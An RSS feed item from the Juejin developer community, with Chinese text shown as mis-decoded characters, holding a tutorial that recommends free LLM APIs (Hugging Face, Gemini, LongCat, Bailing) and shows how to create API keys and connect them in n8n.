<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ã€n8nã€æ¨èå‡ ä¸ªå…è´¹çš„å¤§æ¨¡å‹ç»™å­¦ä¹ n8nçš„å·¥å‹ä»¬ä½¿ç”¨]]></title>    <link>https://juejin.cn/post/7602488966610386982</link>    <guid>https://juejin.cn/post/7602488966610386982</guid>    <pubDate>2026-02-04T00:14:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966610386982" data-draft-id="7602512226998550578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€n8nã€æ¨èå‡ ä¸ªå…è´¹çš„å¤§æ¨¡å‹ç»™å­¦ä¹ n8nçš„å·¥å‹ä»¬ä½¿ç”¨"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC,LLM"/> <meta itemprop="datePublished" content="2026-02-04T00:14:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾·è‚²å¤„ä¸»ä»»"/> <meta itemprop="url" content="https://juejin.cn/user/2673620576140030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€n8nã€æ¨èå‡ ä¸ªå…è´¹çš„å¤§æ¨¡å‹ç»™å­¦ä¹ n8nçš„å·¥å‹ä»¬ä½¿ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2673620576140030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾·è‚²å¤„ä¸»ä»»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:14:36.000Z" title="Wed Feb 04 2026 00:14:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p>
<blockquote>
<p>æ•´ç†äº†ä¸€ä¸ªn8nå°ä¸“æ ï¼Œæœ‰å…´è¶£çš„å·¥å‹å¯ä»¥å…³æ³¨ä¸€ä¸‹ ğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4337364695070801925%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4337364695070801925#wechat_redirect" ref="nofollow noopener noreferrer">ã€Šn8nä¿®ç‚¼æ‰‹å†Œã€‹</a></p>
</blockquote>
<p>å¯¹ n8n åˆå­¦è€…æ¥è¯´ï¼Œä¸ç”¨èŠ±é’±å°±èƒ½è°ƒç”¨å¤§æ¨¡å‹APIï¼Œæ˜¯å¿«é€Ÿä¸Šæ‰‹AIè‡ªåŠ¨åŒ–å·¥ä½œæµçš„å…³é”®ã€‚n8nä½œä¸ºå¯è§†åŒ–è‡ªåŠ¨åŒ–å·¥å…·ï¼Œèƒ½é€šè¿‡APIè¿æ¥å„ç±»å¤§æ¨¡å‹ï¼Œå®ç°æ–‡æœ¬ç”Ÿæˆã€æƒ…æ„Ÿåˆ†æã€å›¾æ–‡å¤„ç†ç­‰åŠŸèƒ½ï¼Œè€Œå…è´¹APIèƒ½å¸®æˆ‘ä»¬é›¶æˆæœ¬ç»ƒæ‰‹ã€éªŒè¯åˆ›æ„ï¼Œä¸ç”¨æ‰¿æ‹…ä»˜è´¹å‹åŠ›ã€‚</p>
<p>æœ¬æ–‡æ¨èå‡ ä¸ªé€‚åˆ n8n å°ç™½çš„å…è´¹å¤§æ¨¡å‹ API æœåŠ¡å•†ã€‚</p>
<p>ä½†éœ€è¦çœ‹æ¸…æœ¬æ–‡çš„å‘å¸ƒæ—¶é—´ï¼Œä¹Ÿè®¸åŠå¹´åã€ä¸€å¹´åè¿™äº› API å°±ä¸å†å…è´¹äº†ã€‚</p>
<p>éƒ¨åˆ†æœåŠ¡å•†è¿˜éœ€è¦ä½ æ‡‚é­”æ³•ã€‚</p>
<p><strong>å¦‚æœä½ ç”¨è¿‡å“ªäº›æ¯”è¾ƒå¥½çš„å¤§æ¨¡å‹ï¼Œä¹Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ï½</strong></p>
<p>å¦‚æœä½ è¿˜ä¸æ¸…æ¥š n8n å¦‚ä½•å¯¹æ¥å¤§æ¨¡å‹ï¼Œæˆ‘å‡†å¤‡äº†2ç¯‡æ–‡ç« ã€‚</p>
<ul>
<li>ã€æ–¹æ³•1ã€‘æ¥å…¥æœ¬åœ°æ¨¡å‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FDAPeojmssNQSyATkwGahIg" target="_blank" title="https://mp.weixin.qq.com/s/DAPeojmssNQSyATkwGahIg" ref="nofollow noopener noreferrer">ã€n8nã€æ¥å…¥æœ¬åœ°éƒ¨ç½²çš„ DeepSeek</a></li>
<li>ã€æ–¹æ³•2ã€‘æ¥å…¥æœåŠ¡å•†çš„æ¨¡å‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsFMaKErfu6cxQAW3XnbLbg" target="_blank" title="https://mp.weixin.qq.com/s/sFMaKErfu6cxQAW3XnbLbg" ref="nofollow noopener noreferrer">ã€n8nã€å¯¹æ¥è±†åŒ…ã€åƒé—®ã€æ–‡å¿ƒã€Kimiç­‰å¤§æ¨¡å‹</a></li>
</ul>
<p>å¦‚æœä½ æ˜¯å¯Œå“¥ï¼Œä¸ªäººç”µè„‘é…ç½®å¾ˆé¡¶çš„è¯ï¼Œå¯ä»¥ç”¨ç¬¬1ç§æ–¹æ³•ã€‚</p>
<p>æœ¬æ–‡æ•´ç†çš„è¿™äº›å…è´¹å¤§æ¨¡å‹ API è¦ç”¨ç¬¬2ç§æ–¹æ³•å¯¹æ¥ã€‚</p>
<p>å¦‚æœç¬¬2ç§æ–¹æ³•éƒ½æ— æ³•å¯¹æ¥çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ã€ŒHTTP èŠ‚ç‚¹ã€æ¥å¯¹æ¥ï¼Œå…·ä½“æ“ä½œè¯·å‚è€ƒğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6beIKSCImOj0xgvPyGmECw" target="_blank" title="https://mp.weixin.qq.com/s/6beIKSCImOj0xgvPyGmECw" ref="nofollow noopener noreferrer">ã€n8nã€é€šè¿‡æ¥å…¥DeepSeekäº†è§£HTTPèŠ‚ç‚¹</a></p>
<p>æ¨èçš„æœåŠ¡å•†æ’åéƒ¨åˆ†å…ˆåï¼Œèƒ½ç”¨å°±è¡ŒğŸ˜„</p>
<p>å‰æ‘‡ç»“æŸï¼Œå¼€å§‹ï¼</p>
<h2 data-id="heading-0">Hugging Face</h2>
<blockquote>
<p>âš¡ï¸Hugging Faceï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co" target="_blank" title="https://huggingface.co" ref="nofollow noopener noreferrer">huggingface.co</a></p>
</blockquote>
<p>Hugging Face æ˜¯å…¨çƒçŸ¥åçš„å¼€æºAIå¹³å°ï¼Œæ‹¥æœ‰æµ·é‡å…è´¹é¢„è®­ç»ƒæ¨¡å‹ï¼Œæ¶µç›–æ–‡æœ¬åˆ†ç±»ã€å¥å­åµŒå…¥ã€è¯­éŸ³è¯†åˆ«ç­‰å„ç±»ä»»åŠ¡ï¼Œé€‚åˆå°ç™½æ¢ç´¢ä¸åŒæ¨¡å‹çš„èƒ½åŠ›ï¼Œä¹Ÿèƒ½é€šè¿‡APIå¿«é€Ÿé›†æˆåˆ°n8nä¸­ã€‚</p>
<p>æ‰“å¼€ Hugging Face å®˜ç½‘ï¼Œç™»å½•åï¼Œç‚¹å‡»å³ä¸Šè§’çš„å¤´åƒï¼Œé€‰æ‹©ã€ŒAccess Tokensã€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06d9b448c7134fdcab69b9f8619c5ad8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=dnGKrFVLsjz6QdHftGolPPA3HHk%3D" alt="01.png" loading="lazy"/></p>
<p>æ¥åˆ°ã€ŒAccess Tokensã€é¡µé¢ï¼Œç‚¹å‡»â€œ+ Create new tokenâ€æŒ‰é’®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da85ba0cdeab4337a0abe933524da750~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=AeOxLLRyn9rB3S1BcpFqIbbePC0%3D" alt="02.png" loading="lazy"/></p>
<p>è¾“å…¥ä¸€ä¸ª Token nameï¼Œä¸‹é¢èƒ½é€‰çš„éƒ½é€‰ä¸Šå§ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb79cf58cf0e4e54b43ba5027149d725~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=CK8wXMtSu0fiuUrMNwfy1p7QLRU%3D" alt="03.png" loading="lazy"/></p>
<p>ç„¶åæ»‘åˆ°é¡µé¢åº•éƒ¨ï¼Œç‚¹å‡»â€œCreate tokenâ€æŒ‰é’®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc6a05acb0cf4f7595d6fb9422aa099d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=9gVChQlcwjGp4qlXNIwq1kQoYgs%3D" alt="04.png" loading="lazy"/></p>
<p>è·å–åˆ°ä»¤ç‰Œåæ‰¾ä¸ªåœ°æ–¹ä¿å­˜å¥½ï¼Œè¿™ä¸ªä»¤ç‰Œåªå±•ç¤ºä¸€æ¬¡ã€‚å¦‚æœå¼„ä¸¢äº†å°±è¦æŒ‰ä¸Šé¢çš„æ­¥éª¤é‡æ–°æ“ä½œä¸€æ¬¡äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51990a4289ee4ff0a80bd6004451adfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=FVcX3Pa0bw5wIh%2F51OkWYkyg4jc%3D" alt="05.png" loading="lazy"/></p>
<p>æ‰“å¼€ n8nï¼Œåœ¨ç•Œé¢é¢æ¿æœç´¢â€œhuggingâ€ï¼Œé€‰æ‹©ç¬¬ä¸€é¡¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb9558148d0344aabed6354489279fba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=%2Bbr4OjhNE4tbOo173jOJRXMOMi4%3D" alt="06.png" loading="lazy"/></p>
<p>å¦‚æœä½ ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„è¯ï¼Œåœ¨â€œCredential to connect withâ€é¡¹é‡Œé€‰æ‹©â€œ+ Create new credentialâ€åˆ›å»ºä¸€ä¸ª Hugging Face çš„å‡­è¯ã€‚å¦‚æœå·²ç»æœ‰å‡­è¯äº†å°±æ˜¯ä¸‹å›¾è¿™æ ·äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3993a48e7cf24a6398bb52d5fb7c18d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=XpKxCIwcmphCirV9Gc0o%2BSQdCKs%3D" alt="07.png" loading="lazy"/></p>
<p>åˆ›å»ºå‡­è¯çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°†åˆšåˆšåœ¨ Hugging Face ç”³è¯·çš„ä»¤ç‰Œå¤åˆ¶åˆ° API Key è¿™é¡¹é‡Œå°±è¡Œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad8b9130fa314986a492ed06ffb760ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=vshspGbt1sNREepvCVoypd1bpwU%3D" alt="08.png" loading="lazy"/></p>
<p>å›åˆ°å·¥ä½œæµå°±å¯ä»¥ç”¨å®ƒäº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/848c45c021c9467587a09758c7ef5c77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=cde0t4IoFEEks47ShMPdFh4sYNk%3D" alt="09.png" loading="lazy"/></p>
<p>Hugging Face ä¸Šè¿˜æœ‰å…¶ä»–æ¨¡å‹å¯ä»¥ç”³è¯·ï¼Œè‡ªå·±å»ç ”ç©¶ä¸€ä¸‹å§ï½</p>
<h2 data-id="heading-1">Gemini</h2>
<blockquote>
<p>âš¡ï¸Google AI Studioï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Faistudio.google.com" target="_blank" title="https://aistudio.google.com" ref="nofollow noopener noreferrer">aistudio.google.com</a></p>
</blockquote>
<p>Gemini çš„å¼€é€šæ–¹å¼æœ‰ç‚¹éº»çƒ¦ï¼Œéœ€è¦æœ‰ Visa å¡æ‰è¡Œã€‚</p>
<p>ç°åœ¨èƒ½ç”¨çš„å…è´¹æ¨¡å‹åªæœ‰ flash ç³»åˆ—çš„ï¼Œpro ä¹‹å‰è¢«ç™½å«–å¤ªå¤šäº†å·²ç»ä¸å¼€æ”¾äº†ï¼Œä»¥åä¼šä¸ä¼šé‡æ–°å¼€æ”¾ä¸å¥½è¯´ã€‚</p>
<p>æ‰“å¼€ Google AI Studioï¼Œç™»å½•å®Œï¼Œç‚¹å‡»å·¦ä¸‹è§’çš„â€œGet API keyâ€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f913a4e406ad48c083b5b2c96cc0d977~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=4MG9KjK4qVwLKy95cQDSmreS2os%3D" alt="10.png" loading="lazy"/></p>
<p>ç„¶ååˆ›å»ºä¸€ä¸ª API å¯†é’¥ã€‚</p>
<p>å¦‚æœæ²¡é¡¹ç›®çš„è¯ï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c18751363dde4708889b72e42d58bb23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=leWjm7LRiE0k%2BtE90jHu9yGLwtQ%3D" alt="11.png" loading="lazy"/></p>
<p>åˆ›å»ºå®Œ API å¯†é’¥åï¼Œç‚¹å‡»å¤åˆ¶æŒ‰é’®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b013c373bb64f8991449d5d20b8b947~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=gZdQB4N1poFd3%2FCja8oX24MF2Gw%3D" alt="12.png" loading="lazy"/></p>
<p>æ¥åˆ° n8n è¿™è¾¹åˆ›å»º Google Gemini å‡­è¯å°±èƒ½ç”¨äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c827e7f5a99c478887c477567a0739f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=0uuo6t8TceiVSnOv0Wu2tUCbuFE%3D" alt="13.png" loading="lazy"/></p>
<h2 data-id="heading-2">LongCatï¼ˆç¾å›¢ï¼‰</h2>
<blockquote>
<p>âš¡ï¸LongCatï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.chat%2Fplatform%2Fapi_keys" target="_blank" title="https://longcat.chat/platform/api_keys" ref="nofollow noopener noreferrer">longcat.chat/platform/apâ€¦</a></p>
</blockquote>
<p>LongCat æ˜¯ç¾å›¢è‡ªä¸»ç ”å‘çš„å¤§è¯­è¨€æ¨¡å‹ï¼Œæ¯å¤©åˆ·æ–°500ä¸‡ token ç»™ä½ ç”¨ã€‚è€Œä¸”å“åº”é€Ÿåº¦å¾ˆå¿«ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/027533063cc843968f3e723222e6ed2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=tooc2H%2F5gsVFGoT4%2FPBHf1e%2BkJ4%3D" alt="14.png" loading="lazy"/></p>
<p>ç™»å½•åï¼Œåœ¨ API Keys é¡µé¢åˆ›å»º API Key å°±å¯ä»¥ç”¨äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd2379ea762746c288f75b16d62c8274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=aqbPasisNogrI7Im6RNHTOwelTU%3D" alt="15.png" loading="lazy"/></p>
<p>å…·ä½“æ¥å…¥çš„ URL å¯ä»¥çœ‹ LongCat å®˜æ–¹æ–‡æ¡£ğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.chat%2Fplatform%2Fdocs%2Fzh%2F" target="_blank" title="https://longcat.chat/platform/docs/zh/" ref="nofollow noopener noreferrer">longcat.chat/platform/doâ€¦</a></p>
<p>æˆ‘ç”¨äº† HTTP èŠ‚ç‚¹æ¥å…¥ï¼ŒèŠå¤©å¯¹è¯çš„è¯ <code>URL</code> å¯å¡«å…¥ <code>https://api.longcat.chat/openai/v1/chat/completions</code>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb31725d7f6c44c9ad99861e4179840c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=%2BTB68rVf4xl6V4HbH4XXGAwx0kg%3D" alt="16.png" loading="lazy"/></p>
<p>äº²æµ‹èƒ½ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caef3296300345fb8ed246ea8aaf4a8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=aDaoW5Qawfm4JlSPmzLSSJNUfaw%3D" alt="17.png" loading="lazy"/></p>
<h2 data-id="heading-3">ç™¾çµï¼ˆé˜¿é‡Œï¼‰</h2>
<blockquote>
<p>âš¡ï¸ ç™¾çµï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fling.tbox.cn%2Fopen" target="_blank" title="https://ling.tbox.cn/open" ref="nofollow noopener noreferrer">ling.tbox.cn/open</a></p>
</blockquote>
<p>ç™¾çµå¤§æ¨¡å‹æ˜¯èš‚èšé›†å›¢æ¨å‡ºçš„Ling-1Tå¤§æ¨¡å‹å¯¹è¯ä½“éªŒå¹³å°ï¼Œå®šä½ä¸ºå…¨èƒ½å‹AIåŠ©æ‰‹ï¼Œå…¼é¡¾åŸºç¡€æ–‡æœ¬å¤„ç†ä¸å¤æ‚æ¨ç†ï¼Œæ”¯æŒå¤šæ¨¡æ€èƒ½åŠ›ï¼Œä¸”é€‚é…OpenAIæ¥å£æ ¼å¼ï¼Œèƒ½å¿«é€Ÿé›†æˆåˆ°n8nä¸­ã€‚</p>
<p>ç™¾çµæ¯å¤©ä¼šåˆ·æ–°50ä¸‡è®¡ç®—å•ä½ï¼ˆtokenï¼Ÿï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/615333667d5149efb665e199c0622930~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=j3FRAKicuDFkM41U0OtyCMSWCOs%3D" alt="18.png" loading="lazy"/></p>
<p>é¦–æ¬¡ç™»å½•éœ€è¦ç»‘å®šè‡´å¯Œå®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d84cf919eb84c71a75b1d46de7c36d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=8TKN9VAajCbLA%2Bqkp5FYidM81IY%3D" alt="19.png" loading="lazy"/></p>
<p>ç»‘å®šæˆåŠŸåï¼Œåœ¨åå°å°±å¯ä»¥åˆ›å»ºä»¤ç‰Œäº†ï¼Œå¹¶ä¸”æ¯å¤©èƒ½åˆ·æ–°å…è´¹é¢åº¦ã€‚</p>
